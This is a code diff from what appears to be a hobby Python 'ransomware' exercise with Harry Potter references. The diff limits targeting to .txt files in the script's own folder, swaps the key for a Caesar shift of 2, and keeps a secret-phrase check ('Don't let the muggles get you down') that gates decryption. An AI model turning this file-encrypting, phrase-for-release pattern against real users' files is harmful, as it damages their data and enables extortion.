@@ -36,7 +36,7 @@ def decrypt_file(key, filename):
         content = file.write(decrypted_data)
 
 
-# List of files in folder
+# List of file paths in path
 def file_paths(path):
 
     files = []
@@ -48,7 +48,9 @@ def file_paths(path):
             continue
 
         file_path = os.path.join(path, file)
-        if os.path.isfile(file_path):
+
+        # Only considering text files
+        if os.path.isfile(file_path) and file.endswith(".txt"):
             files.append(file_path)
 
     return files
@@ -92,8 +94,8 @@ if __name__ == '__main__':
         quit()
 
 
-    # Key (could be generated through algo)
-    key = "voldemort"
+    # Key (using caesar cipher for now!)
+    key = 2
 
     # Encrypt files of same folder (which has maze)
     path = os.path.dirname(os.path.abspath(__file__))
@@ -103,7 +105,7 @@ if __name__ == '__main__':
 
     # Ransomware real work
     secret_phrase = "Don't let the muggles get you down"
-    user_phrase = input('Enter the secret phrase: ')
+    user_phrase = input('Enter the secret phrase: ')    
 
     if(user_phrase == secret_phrase):
         decrypt_all_files(key, path)
